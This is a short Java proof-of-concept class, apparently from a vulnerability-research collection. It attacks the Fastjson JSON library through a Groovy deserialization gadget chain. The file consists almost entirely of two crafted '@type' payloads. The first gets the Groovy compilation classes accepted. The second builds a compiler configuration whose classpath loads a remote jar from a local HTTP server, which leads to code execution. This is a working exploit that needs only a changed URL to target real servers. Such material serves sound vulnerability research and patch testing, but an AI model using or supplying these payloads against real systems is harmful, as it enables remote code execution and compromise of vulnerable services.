package vul;

import com.alibaba.fastjson.JSON;

public class GroovyAttack {
    public static void main(String[] args) {
        groovy();
    }

    public static void groovy(){
        String poc1 = "{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
                "    \"unit\":{}\n" +
                "}";

        try{
            JSON.parse(poc1);
        }catch(Exception e){

        }


        String poc2 = "{\n" +
                "    \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                "    \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                "    \"config\":{\n" +
                "     \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                "     \"classpathList\":\"http://127.0.0.1:8090/groovyCalc.jar\"\n" +
                "    }\n" +
                "}";

        JSON.parse(poc2);
    }
}
